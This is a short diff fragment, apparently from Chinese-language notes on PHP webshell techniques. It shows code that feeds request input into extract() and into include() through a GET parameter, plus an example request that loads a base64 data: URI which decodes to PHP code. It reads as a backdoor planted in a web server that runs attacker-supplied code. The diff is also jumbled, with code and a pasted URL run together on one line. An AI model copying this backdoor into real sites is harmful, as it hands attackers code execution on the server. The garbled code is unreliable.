@@ -41,18 +41,16 @@ function update($phpCode) {
 }
 extract(update($_REQUEST["c"]));
 
+<?php
 function cc(){
     global $b;
     $a =$_GET[$b];  //此处可改成POST方式
     $str =$a;
     return $str;
 }
-?>
-<?php
 $b="url";
 $c=cc();
 $aa = $c;
-
 include($aa); include.php?url=data:image/png;base64,PD9waHAgcGhwaW5mbygpOyA/Pg==
 
 2.使用php扩展
